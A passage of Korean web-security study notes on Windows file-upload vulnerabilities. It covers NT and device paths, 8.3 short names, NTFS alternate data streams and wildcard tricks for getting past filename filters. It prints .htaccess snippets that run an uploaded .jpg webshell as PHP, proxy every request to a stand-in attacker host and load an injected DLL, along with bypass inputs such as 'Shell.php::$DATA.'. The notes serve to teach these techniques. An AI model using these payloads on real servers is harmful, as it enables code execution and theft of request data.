        | ```\\?\``` | NT 객체 관리자 하위체계(Object Manager Subsystem, Ob)의 객체 및 심볼릭 링크 등을 <br/>접근하는 경로의 시작 <br/> &nbsp;&nbsp; - 기본 경로는 ```\\.\```와 같음 |
        | ```\\?\GLOBALROOT\``` | 실제 Object Manager의 최상위 경로를 접근하는 경로 |
        | ```\\?\GLOBALROOT\Device``` | NT 장치 객체를 포함하는 디렉터리 |
        | ```\??\``` | ```\\?\```와 동일하게 사용할 수 있음 → ⚠️ **주의**: 와일드 카드 등의 문자가 다른 의미를 지니게 됨 |
        | ```\\<호스트명>\<공유명>\``` | 네트워크 상에서 공유된 자원에 접근할 수 있는 UNC 경로 |

        | 장치 파일 | 설명 |
        |:---:|------|
        | NUL, CON, AUX, PRN, <br/>COM1, COM2, COM3, COM4, <br/> LPT1, LPT2, LPT3, LPT4, ... | 예약된(reserved) DOS 기본 장치 이름 → ```\\.\NUL```과 같이 사용할 수 있음 |
        | CON (```\\.\CON```) | 현재 콘솔 장치를 나타냄 |
        | CONIN$ (```\\.\CONIN$```) | 현재 콘솔 입력 장치를 나타냄 |
        | CONOUT$ (```\\.\CONOUT$```) | 현재 콘솔 출력 장치를 나타냄 |
        | ```\\?\GLOBALROOT\Device\HarddiskVolumne<N>```... | 다른 드라이브를 선택할 때 ```C:\```와 같은 문법 대신 사용할 수 있음 |
    - **임시 파일**: 운영체제 및 서비스에서 사용하는 임시 디렉터리
        | 디렉터리 | 설명 |
        |:---:|------|
        | C:\Windows\Temp | 임시 파일을 저장함 |
        | %UserProfile%\AppData\Local\Temp | 일반적으로 사용자별 임시 파일이 저장되는 경로

<br/><br/>

### 파일 업로드 시 공격 지점
* 일반적으로 윈도우 웹 서버는 ```AUTHORITY\LocalService``` 또는 ```NTAUTHORITY\NetworkServices``` 사용자 권한으로 실행됨
    - 실행 권한에 따른 공격 영향
        | 웹 서비스의 실행 권한 | 설명 |
        |:---:|------|
        | 높은 권한 | 파일 업로드 취약점을 이용한 공격이 용이해짐 |
        | 일반 권한 | 파일 업로드 공격으로 인한 피해를 최소화할 수 있음 <br/> ***→ ⚠️ 웹 서버의 파일 시스템 구조를 이해하고 있으면 일반 권한으로 덮어쓸 수 있는 파일을 덮어써서 임의 코드를 실행할<br/> &nbsp;&nbsp;&nbsp;&nbsp; 수 있음*** |
    - 높은 권한이 아니더라도 시스템 관리자가 웹 서비스와 같은 계정으로 로그인한다면 코드 실행 등의 공격이 가능함

<br/>

* 파일 업로드 취약점 공격 시 이용 가능한 지점
    - Apache Web Server
        + 아파치 웹 서버의 설정 파일
            - 일반적으로 ```C:\ApacheXY\htdocs``` 또는 ```C:\www``` 디렉터리에서 관리함
            - 설정 파일 내에서 ```AccessFileName``` 지시어를 사용하면 설정 파일을 분산하여 관리할 수도 있음
                ```Apache
                AccessFileName filename [fileanme ...]
                ```
                + 기본값: ***.htaccess*** 파일 [🔗](https://httpd.apache.org/docs/2.4/en/howto/htaccess.html)
                    ```Apache
                    AccessFileName .htaccess
                    ```
                    - ⚠️ ***.htaccess*** 파일은 **웹 서버의 권한만** 있다면 덮어쓸 수 있음 → ***.htaccess*** 파일을 사용하는 웹 서버에서 파일 업로드 취약점 발생 시 다양한 공격 행위를 수행할 수 있음
                        + 파일 업로드 취약점을 이용하여 ***.htaccess***를 작성한 후 웹 문서 디렉터리에 업로드하면 *.php* 확장자를 우회할 수 있음
                            - 웹셸을 실행하거나 해당 디렉터리 내의 문서를 접근할 때 공격자의 웹 페이지가 접속되는 등 영향을 미치게 됨
                            - ❗️ 웹 마스터가 ```AllowOverride```, ```AllowOverrideList``` 디렉터브에서 허용한 디렉티브만 사용할 수 있음
                    - ```AccessFileName``` 지시어로 설정한 설정 파일에서 모든 설정을 변경할 수 있는 것은 아님
                        + 📌 **```AllowOverride```와 ```AllowOverrideList``` 지시어**를 통해 명시한 지시어만 사용할 수 있음 [🔗](https://httpd.apache.org/docs/2.4/ko/mod/core.html#allowoverride) <br/> &nbsp;&nbsp; → 이를 통해 웹 문서 디렉터리 내에서 특정 파일을 추가적으로 설정 파일로 입력받을 수 있음
        + ***.htaccess*** 파일을 이용한 공격 방법
            - **과정 1**: ***.php*** 확장자 외의 다른 확장자를 PHP 스크립트로 해석하도록 ***.htaccess*** 파일을 작성 (확장자 우회)
                + ```<Files>``` 섹션을 이용한 확장자 우회 예시 [🔗](https://httpd.apache.org/docs/2.4/mod/core.html#files)
                    ```Apache
                    <Files "webshell-dreamhack.jpg">
                        # php-fpm (PHP FastCGI Process Manager)를 사용하는 경우
                        SetHandler "proxy:fcgi:\\locahost"

                        # Apache2 자체 mod_php를 사용하는 경우
                        SetHandler application/x-httpd-php
                    </Files>
                    ```
                    - ```<Files>``` 섹션에 포함된 지시어들은 어떤 디렉터리에 있는지 관계 없이 지정한 이름을 가진 파일에 적용됨 <br/> &nbsp;&nbsp; → 위치와 관계없이 해당 이름을 가진 파일에 대한 요청이 들어오면 ```SetHandler```에 의해 명시된 핸들러가 처리함
            - **과정 2**: 요청 리다이렉트 → 모든 요청을 공격자의 웹 서버로 전달하도록 설정을 변경함
                + 공격자 서버 리다이렉트 예시
                    ```Apache
                    RewriteEngine On
                    RewriteOptions inherit # 부모의 설정을 상속받음(inherit)

                    # mod_proxy_fcgi를 사용하는 경우 FastCGI 서버로 요청 프록시
                    RewriteRule (.*) fcgi://attacker.example.com.$1 [P]
                    # mod_proxy_http를 사용하는 경우 HTTP 서버로 요청 프록시
                    RewriteRule (.*) http://%{HTTP_HOST}at.attacker.example.com.$1 [P]
                    # HTTP Redirect 적용
                    RewriteRule (.*) http://%{HTTP_HOST}at.attacker.example.com.$1 [R=302, L]

                    # 에러 페이지를 공격자의 웹 페이지로 리다이렉트함
                    ErrorDocument 404 https://attacker.example.com/
                    ```
                    | 지시어 | 설명 |
                    |:---:|------|
                    | ```RewriteEngine``` | Runtime Rewriting Engine을 활성화(On) 또는 비활성화(Off)함 [🔗](https://httpd.apache.org/docs/2.2/en/mod/mod_rewrite.html#rewriteengine) |
                    | ```RewriteOptions``` | 현재 서버별 또는 디렉터리별 구성에 대한 일부 특수 옵션을 설정함 [🔗](https://httpd.apache.org/docs/2.2/en/mod/mod_rewrite.html#rewriteoptions) <br/> &nbsp;&nbsp; - ```inherit```, ```AllowAnyURI```, ```MergeBase``` 중 하나만 설정할 수 있음 |
                    | ```RewriteRule``` | Rewrite Engine에 대한 규칙을 정의함 [🔗](https://httpd.apache.org/docs/2.2/en/mod/mod_rewrite.html#rewriterule) <br/> &nbsp;&nbsp; - 형식: ```RewriteRule Pattern Subsitution [flags]``` |
                    | ```ErrorDocument``` | 문제/오류 발생 시 다음 4가지 중 하나를 수행하도록 함 [🔗](https://httpd.apache.org/docs/2.2/en/mod/core.html#errordocument) <br/> &nbsp;&nbsp; - 하드코딩된 간단한 오류 메시지 출력 <br/> &nbsp;&nbsp; - 커스텀한 메시지 출력 <br/> &nbsp;&nbsp; - 문제/오류 처리를 위해 내부적으로 로컬 URL 경로로 리다이렉션 <br/> &nbsp;&nbsp; - 문제/오류 처리를 위해 외부 URL로 리다이렉션 |
                + 요청 중에 계정 정보를 포함한 민감한 정보가 포함되어 있다면 이를 또 다른 목적으로 사용할 수 있음
            - **과정 3**: ```C:\www``` 디렉터리 변경이 가능한 경우 업로드한 공유 라이브러리를 로드해 임의 코드 실행이 가능함
                + 변경 사항을 웹 서버에 반영하기 위해서는 **서비스 재시작이 필요함**
                + 공유 라이브러리 예시
                    ```Apache
                    # 서버가 재시작될 때 C:\www\path\to\my\injected\library.dll을 읽어들여 임의 코드를 실행함
                    LoadFile "C:\www\path\to\my\injected\library.dll"
                    ```
                    | 지시어 | 설명 |
                    |:---:|------|
                    | ```LoadFile``` | 서버가 시작하거나 재시작할 때 지정한 목적 파일이나 라이브러리를 읽어들임(link in) [🔗](https://httpd.apache.org/docs/2.2/en/mod/mod_so.html#loadfile) <br/> &nbsp;&nbsp; - 형식: ```LoadFile filename [filename ...]``` |
    - 관리자 권한에서 접근 가능한 시스템 파일의 일부
        | 파일 | 설명 |
        |:---:|------|
        | C:\Windows\System32\config\systemprofile | ```NT AUTHORITYSYSTEM```의 사용자 프로필 계정 <br/> (Linux의 ```/root```에 대응한다고 볼 수 있음) |
        | C:\Windows\System32\config\System <br/> C:\Windows\System32\config\System.alt <br/> C:\Windows\System32\config\System.log <br/> C:\Windows\System32\config\System.sav | ```HKEY_LOCAL_MACHINE\SYSTEM``` 레지스트리 키에 대응하는 하이브 파일 <br/> &nbsp;&nbsp; → 주요 설정 정보를 저장함 |
        | C:\Windows\System32\config\Software <br/> C:\Windows\System32\config\Software.log <br/> C:\Windows\System32\config\Software.sav | ```HKEY_LOCAL_MACHINE\SOFTWARE``` 레지스트리 키에 대응하는 하이브 파일 <br/> &nbsp;&nbsp; → 설치된 소프트웨어에서 사용됨 |
        | C:\Windows\System32\config\SAM <br/> C:\Windows\System32\config\SAM.log <br/> C:\Windows\System32\config\SAM.sav | ```HKEY_LOCAL_MACHINE\SAM``` 레지스트리 키에 대응하는 하이브 파일 <br/> &nbsp;&nbsp; → 사용자 비밀번호 및 인증 정보 등을 저장함 <br/> &nbsp;&nbsp; (SAM: Security Account Manager의 약자) |
        | C:\Windows\System32\config\Security <br/> C:\Windows\System32\config\Security.alt <br/> C:\Windows\System32\config\Security.log <br/> C:\Windows\System32\config\System.sav | ```HKEY_LOCAL_MACHINE\SECURITY``` 레지스트리 키에 대응하는 하이브 파일 <br/> &nbsp;&nbsp; → 윈도우의 보안 데이터베이스를 저장함 |
        | C:\Windows\System32\config\Default <br/> C:\Windows\System32\config\Default.log <br/> C:\Windows\System32\config\Default.sav | ```HKEY_LOCAL_MACHINE\DEFAULT``` 레지스트리 키에 대응하는 하이브 파일 <br/> &nbsp;&nbsp; → 사용자별 레지스트리 키의 기본 구조를 지정함 |
    - 사용자 권한에서 접근 가능한 파일의 일부
        | 디렉터리 | 설명 |
        |:---:|------|
        | %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup | 현재 사용자의 시작 프로그램 목록이 저장됨 |
        | %ALLUSERSPROFILE%\Microsoft\Windows\Start Menu\Programs\Startup | 모든 로컬 사용자의 시작 프로그램 목록이 저장됨 |

<br/><br/>

### 윈도우 파일 및 경로
* 윈도우 파일명
    - 📌 파일명의 끝에 ```.```이나 공백 문자를 덧쓰면 이를 자동으로 제거함
        | | 예시 |
        |:---:|------|
        | 파일명 | ```Shell.php.. . . ...``` 파일명 |
        | 운영체제 해석 결과 | ```Shell.php```로 해석 (```.``` 문자와 스페이스 문자를 제거한 나머지만을 파일명으로 해석함) |
    - Windows의 바탕이 되는 DOS 운영체제의 파일명 특징
        - 파일명 최대 8글자, 확장자 최대 3글자만 허용함
        - ```.``` 문자를 허용하지 않음
        - 11 바이트의 고정 버퍼를 사용하여 ```ALICE.H```는 실제로 내부적으로 ```ALICE   H  ```로 표현됨
            + ```FILENAME.```은 확장자가 없는 파일명으로 ```FILENAME```과 같이 취급됨 (파일명 뒤의 스페이스도 자동으로 무시됨)

<br/>

* 경로 변환
    - 📌 Unix 계열의 운영체제와의 호환성을 위해서 경로 구분 문자인 ```/```을 ```\```로 자동으로 변환함
        + Linux에서는 Windows의 경로 구분 문자인 ```\```를 ```/```로 자동으로 변환하지 않음
    - 웹 어플리케이션이 파일 경로 문자로 ```\```만을 인식하는 경우 **```/```를 사용해서 경로 검사(필터)를 우회할 수 있음**
        | 경로 | 실제 경로 |
        |---|---|
        | ```C:\Windows``` <br/> ```C:/Windows``` (```\```로 자동 변환) | ```C:\Windows``` |
        | ```C:\htdocs\upload/foo/bar``` | ```C:\htdocs\upload\foo\bar``` |
        | ```C:\htcods\upload\baz\../../../Windows``` <br/> &nbsp;&nbsp; → ```C:\htodcs\uploads\baz\..\..\..\Windows``` (```\```로 자동 변환) | ```C:\Windows``` |
        | ```\\?\C:\htdocs\upload\qux\../..``` (자동 변환 적용 X) | (```\\?\```) ```C:\htdocs\upload\qux\../..``` |
        | ```\\?\C:\htdocs\upload\quux\../..//./```(자동 변환 적용 X) | (```\\?\```) ```C:\htdocs\upload\quux\../..//./``` |
        + ⚠️ **주의**: ```\\?\```로 시작하는 경로에 대해서는 슬래시 자동 변환이 적용되지 않음

<br/><br/>

### 윈도우 경로 표기
* 윈도우 운영체제의 다양한 드라이브 및 디바이스 경로 표현 방법
    - **드라이브 절대 경로** → 일반적으로 윈도우 파일 접근 시 사용하는 경로의 유형
        | 형식 | 예시 |
        |:---:|------|
        | ```{드라이브 문자}:\{경로}``` | - ```C:\Windows\System32\calc.exe``` <br/> - ```C:\Users\dream\Documents\crackme\..\README.md``` <br/> - ```F:\Media\Intro.mp4``` |
        + ⚠️ 웹 어플리케이션이 특정 문자나 패턴을 파일명에서 필터링할 경우 **절대 경로 대신 다른 형식을 사용해 이를 우회할 수 있음**
    - **드라이브 상대 경로**
        | 형식 | 예시 |
        |:---:|------|
        | ```{드라이브 문자}:{경로}``` | - ```C:notes.txt``` <br/> - ```C:Foo\bar.obj``` <br/> - ```D:..\Test\other.doc``` |
        + ```\``` 문자를 사용하지 않으면서 다른 드라이브의 파일을 참조할 수 있도록 함
        + DOS 프로그램과의 호환성을 위해 ```=C:```, ```=D:```와 같은 환경 변수를 통해 각각의 드라이브 별로 현재 디렉터리를 따로 지정할 수 있음
            - 해당 환경 변수에 값이 할당되어 있지 않으면 드라이브의 최상위 경로를 가리킴
            - 예시: ```=D:``` 환경 변수의 설정에 따른 ```D:httpd.exe``` 경로 해석
                | ```=D:``` 환경 변수 설정 | 경로 해석 결과 |
                |:---:|------|
                | ```D:\Apache2\Bin``` | ```D:\Apache2\Bin\httpd.exe```로 해석됨 |
                | 해당 환경 변수가 없음 | ```D:\httpd.exe```로 해석됨 |
    - **NT 객체 경로** (NT Object Manager 네임스페이스 경로)
        | 형식 | 설명 |
        |:---:|------|
        | ```\\?\{객체 경로명}``` | 경로명을 그대로 사용함 <br/> &nbsp;&nbsp; - 드라이브 절대 경로 방식과 유사하지만 특수 문자 및 파일명을 사용할 수 없음 |
        | ```\??\{객체 경로명}``` | ```..```와 같은 요소가 경로에 포함될 경우 자동 확장 처리됨 → 특수 파일명을 사용할 수 없음 |
        + NT 객체 경로의 특징
            - 윈도우에서 미리 등록한 장치 및 드라이브의 예약어를 사용함
            - 드라이브 대신에 볼륨명을 지정할 수 있음
                + ```\\?\GLOBALROOT\Device\HarddiskVolumne[N]```, ```\??\GLOBALROOT\Device\HarddiskVolume[N]``` 구문으로 지정 가능
            - 웹 서버에 네트워크 공유 서비스가 존재할 때 ```\\?\127.0.0.1\c$\```와 같이 내부 서비스를 통해 파일에 접근할 수 있음
        + NT 객체 경로의 예시
            | 예시 | 설명 |
            |---|------|
            | - ```\\?\C:\Windows\System32``` | ```C:\Windows\System32``` 경로명을 그대로 사용함 |
            | - ```\\?\GLOBALROOT\Device\HarddiskVolume1\C:\Windows\System32``` <br/> - ```\??\GLOBALROOT\Device\HarddiskVolume1\C:\Windows\System32``` | 드라이브 대신 볼륨명을 사용함 |
            | - ```\\?\GLOBALROOT\SystemRoot``` <br/> - ```\??\GLOBALROOT\SystemRoot``` | ```C:\Windows``` 디렉터리에 접근할 수 있음 |
    - 그 외의 윈도우 운영체제에서 사용하는 경로의 유형들
        | 유형 | 형식 | 예시 |
        |:---:|:---:|------|
        | 드라이브 내 절대 경로 | ```\{경로명}``` | - ```\Windows\System32\calc.exe``` <br/> - ```\Build\DreamhackExample\Lib\x86\..\Common\LfdTypes.h``` |
        | 드라이브 내 상대 경로 | ```{경로명}``` | - ```Documents\desktop.ini``` <br/> - ```..\..\..\..\Dir1\..\..\..\Users``` |
        | Win32 장치 경로 | ```\\.\{장치 경로명}``` | - ```\\.\NUL```, ```\\.\CON```, ```\\.\PRN``` 등 <br/> &nbsp;&nbsp; (```{장치경로명}```: *윈도우 파일시스템의 장치 및 가상 파일* 부분을 참고) <br/> - ```\\?\PIPE\{파이프명}``` : Windows NT Pipe 객체(IPC) |
        | UNC 경로 | ```\\{서버}\{공유명}[\{경로}]``` <br/> ```\\?\UNC\{서버}\{공유명}[\{경로}]``` | - ```\\smb.dreamhack.io\share``` <br/> &nbsp;&nbsp; = ```\\?\UNC\smb.dreamhack.io\share``` <br/> - ```\\?\localhost\c$\Windows``` <br/> &nbsp;&nbsp; = ```\\?\127.0.0.1\c$\Windows``` |

<br/>

* DOS 8.3 파일명 사용
    - **짧은 파일명** (SFN, short filename) = DOS 8.3 파일명(8.3 filename)
        + 파일명 최대 8글자, 확장자 최대 3글자만을 허용하며 모든 문자가 대문자로 구성된 DOS 운영체제의 파일명
    - **긴 파일명** (LFN, long filename)
        + 윈도우 3.5부터 지원하는, 짧은 파일명의 제약을 없앤 Windows 운영체제의 파일명
        + 📌 DOS와의 호한성을 위해 LFN(긴 파일명)에 대해 **8.3 파일명 별칭**을 부여함 → 별칭을 이용하면 확장자 검사를 우회할 수 있음
            | 긴 파일명 | 8.3 파일명 별칭 |
            |---|:------:|
            | webshell.phtml | WEBSHE1.PHT |
            | .htaccess | HTACCE~1 |
            | Web.config | WEB~1.CON |
        + 구체적인 별칭 부여 규칙
            | | 설명 |
            |:---:|------|
            | 1 | 파일명은 **대문자로만** 이루어져야 함 → 소문자는 대문자로 자동 치환됨 |
            | 2 | 스페이스, ASCII 제어 문자(```STX```, ```ESC``` 등) 및 ASCII 외 문자(확장 문자집합이 활성화된 경우)는 모두 제거됨 |
            | 3 | ```+```와 같은 특수 문자는 밑줄(```_```)로 치환됨 |
            | 4 | 기본 파일명은 8글자 이하, 확장자는 3글자 이하여야 하며, 양 구성요소 모두 ```.```를 포함할 수 없음 <br/> &nbsp;&nbsp; -  길이 제한을 넘는 파일명 예시: ```Dreamhack.jpg``` → ```DREAMH~1.JPG```, ```Dreamhack.html``` → ```DREAMH~1.HTM```와 같이 변환됨 |
            | 5 | 첫 6바이트가 중복되는 파일이 생성되면 두 번째로 생성되는 파일의 ```~``` 문자 뒤의 숫자가 1 증가한 값으로 생성딤 <br/> &nbsp;&nbsp; - 기존에 ```DREAMH~1.JPG```가 생성되어 있는 경우 예시: ```Dreamhill.jpg``` → ```DREAMH~2.JPG``` |
            | 6 | 만일 중복되어 추가적으로 생성된 파일의 숫자가 4를 넘어가거나 기본 파일명이 2글자 이하인 경우 파일명에 해쉬값이 포함됨 |
            + 1번과 6번을 제외한 아래 모든 조건을 충족하는 경우(치환이 일어나지 않는 경우) 별칭 부여가 일어나지 않음
    - 8.3 파일명 별칭 생성을 막는 방법: ```fsutil.exe 8dot3name``` 명령 이용
        + ⚠️ DOS 8.3 별칭에 의존하는 일부 프로그램에서 호환성 문제가 발생할 수 있기 때문에 사용하는 데 주의가 필요함
        + ```fsutil``` 사용법 [🔗](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/fsutil-8dot3name)
            ```windows
            fsutil 8dot3name [query] [<volumnepath>]
            ```
            - 지정한 디스크 볼륨에 대한 8.3 별칭 비활성화 동작을 쿼리함

<br/><br/>

### 우회 공격
* NTFS Alternative Data Stream을 이용한 우회
    - 파일 시스템의 **Fork**: 압축(아카이브) 파일처럼 한 파일명에 메타데이터 등 여러 종류의 데이터(데이터 스트림)을 포함시킬 수 있도록 하는 개념
        + 윈도우 NT 계열의 운영체제가 사용하는 NTFS(New Technology File System)에서는 이를 **ADS**(Alternative Data Stream)으로 구현하고 있음
    - NTFS의 **ADS**(Alternative Data Stream) 영역
        | | 설명 |
        |:---:|------|
        | 등장 배경 | - macOS(맥킨토시) HFS 파일 시스템과의 호환성을 목적으로 등장함 <br/> - 파일에 사용되는 기본 스트림 외에 파일이 필요로 하는 파일의 아이콘 등 **부가적인 데이터를 다른 스트림에 추가로 저장하기 위해 사용** <br/> &nbsp;&nbsp;&nbsp;&nbsp; - 파일이 ```$DATA``` 속성을 하나 이상 가질 수 있는데, 추가적으로 존재하는 ```$DATA``` 속성을 **ADS**라고 함 |
        | 악용 | 한 파일에 여러 가지 데이터를 각 데이터 스트림에 감출 수 있음 → ⚠️ **악성코드를 삽입하는 데 많이 이용되었음** <br/> &nbsp;&nbsp; - 텍스트 데이터나 실행 파일의 데이터 등을 은닉하는 등 악의적은 목적으로 사용됨 <br/> &nbsp;&nbsp; - ADS를 활용하는 멀웨어(악성 프로그램)들이 지속적으로 발견되었기 때문에 **대다수의 보안 솔루션들이 ADS를 탐지함** |
    - NTFS ADS 구문
        + 기본 형태: ```ADS Sample.txt:Memo.txt``` (파일명 뒤에 ```:```이 붙고 뒤에 ADS 식별자가 붙는 형식)
            - 각 데이터는 ```파일명:스트림명```으로 접근할 수 있음
        + 구체적인 NTFS ADS 구문
            | 구문 | 설명 |
            |:---:|------|
            | ```Filename:Stream``` <br/> ```Filename:Stream:$DATA``` | ```Filename```의 스트림 ```Stream```을 창조함 |
            | ```Filename:``` <br/> ```Filename::$DATA``` | ```Filename```의 기본 스트림을 창조함 (```:```을 붙이지 않았을 때와 동일함) |
            | ```Dirname::$INDEX_ALLOCATION``` | 해당 파일을 쓰게 되면 파일 대신 디렉터리가 생성됨 <br/> &nbsp;&nbsp; - ```$INDEX_ALLOCATION```: NTFS 내부에서 관리하는 디렉터리 인덱스(데이터베이스 <br/> &nbsp;&nbsp;&nbsp;&nbsp; 인덱스와 유사)의 속성 타입 |
            | ```Dirname:$I30:$INDEX_ALLOCATION``` | 헤당 파일을 쓰게 되면 파일 대신 디렉터리가 생성됨 <b/r> &nbsp;&nbsp; - ```$I30```: 속성 ```0x30```(```$FILE_NAME```)의 인덱스(```I```) |
            | ```Filename:AttrName:$Attr Type``` | 바로 윗 구문의 기본형 <br/> &nbsp;&nbsp; - NTFS 데이터 스트림은 실제로는 ```$DATA```타입의 속성을 의미함 <br/> &nbsp;&nbsp; - 스트림명은 속성의 명칭을 의미함 |
    - NTFS ADS의 특징을 이용해 파일 확장자 검사를 우회하고 공격할 수 있음
        + 예시
            | 입력 | 수행 과정 |
            |:---:|------|
            | ```Shell.php::$DATA.``` | ```.``` 자동 제거에 의해 ```Shell.php::$DATA```가 됨 <br/> &nbsp;&nbsp; → ```Shell.php```의 기본 스트림을 참조함(```Shell.php::```와 ```Shell.php```과 동일함) <br/> &nbsp;&nbsp; → ```Shell.php```와 같은 파일을 사용하게 됨 |
            | ```.htaccess:.jpg``` | ```.htaccess```의 스트림 ```.jpg```를 참조함 (```.htaccess``` 파일을 생성할 수 있음) <br/> &nbsp;&nbsp; → ```.jpg``` 스트림을 사용하게 되므로 8.3 파일명 ```HTACCE~1```로 다시 업로드하는 방식을 사용함 |

<br/>

* 와일드 카드를 이용한 우회
    - Windows 운영체제가 제공하는 ````FindFirstFile*```, ```FindNextFile*``` API
        + 파일 탐색 및 디렉터리 파일 목록 열람을 위한 함수
        + 지원하는 문자
            - ```*``` 및 ```?```와 같은 **와일드카드 문자**를 지원함 → ⚠️ 다양한 변수들이 발생할 수 있기 때문에 각별한 주의가 필요함
            - 상당수의 웹 어플리케이션이 필터링하는 와일드카드 문자 외에도 **문서화되지 않은 문자**를 추가로 지원함
                | 예시 | 결과 |
                | ```Web<<```, ```Web"config``` | ```Web.config``` 파일을 덮어쓸 수 있음 |
        + 규칙
            | 문자 | 설명 | 예시 |
            |:---:|------|:---:|
            | ```*``` | 0개 이상의 문자를 매칭함 <br/> &nbsp;&nbsp; - 문자의 패턴이 ```*.```(```*```과 ```.``` 사이에 다른 ```.```이나 공백이 들어갈 수 있음)인 경우 ```.```은 <br/> &nbsp;&nbsp;&nbsp;&nbsp; 매칭되지 않음 | ```Foo*r``` → ```Foo.bar``` |
            | ```?``` | 1개의 문자 또는 마침표(확장자) 바로 전 또는 파일의 끝을 매칭함 | ```Q?x``` → ```Qux``` <br/> ```Fo?``` → ```Foo``` 또는 ```Fo``` |
            | ```<``` | ```*```와 유사하나 기본 파일명과 확장자 사이를 건너뛰지 않음 <br/> &nbsp;&nbsp; - ```.``` 자체는 **기본 파일명의 일부**로 간주함 <br/> &nbsp;&nbsp; - [예외] 파일이 ```.```로 시작하는 경우 ```.```을 **확장자의 일부**로 간주함 | ```Fo<.X<``` → ```Foo.XLS``` |
            | ```>``` | ```?.```와 동일함 <br/> &nbsp;&nbsp; -  ```.``` 뒤에 높이면 ```.```이 파일의 끝을 매칭하지 않게 됨 | ```Qux.>``` → ```Qux.Z``` |
            | ```"``` | ```.```를 매칭함 | ```File"txt``` → ```File.txt``` |
    - PHP zend Virtual CWD 기능에서 파일명의 절대 경로를 불러올 때 ```Find*File*``` API를 사용하여 위와 같은 규칙을 적용받음 <br/> &nbsp;&nbsp; → 📌 특히 *PHP IIS*에서 주로 쓰이는 테크닉임

<br/><br/><br/>

## 파일명 검증 부재
* 다양한 소프트웨어에서는 파일 경로에서 일부 문자에 특수한 의미를 부여함
    - 파일 경로에서 사용되는 문자들의 종류
        | 문자 | 설명 |
        |:---:|------|
        | ```/``` 또는 ```\``` | 파일 경로에서 디렉터리명을 구분짓는 데 사용함 |
        | ```.``` | - 파일 경로에서 **현재 디렉터리**를 의미함 <br/> - 파일명과 함께 사용될 경우 **확장자를 구분짓는 용도**로도 사용됨 |
        | ```..``` | 파일 경로에서 **상위 디렉터리**를 의미함 |
    - ⚠️ 웹 서비스에서 파일을 업로드/다운로드할 때 **특수한 의미를 지닌 문자를 제대로 필터링하지 않고 파일시스템에서 사용**할 경우 File Vulnerability(파일 취약점)이 발생할 수 있음

<br/><br/>

### 파일명 널(NULL) 문자 삽입

<br/><br/><br/>

## 응용
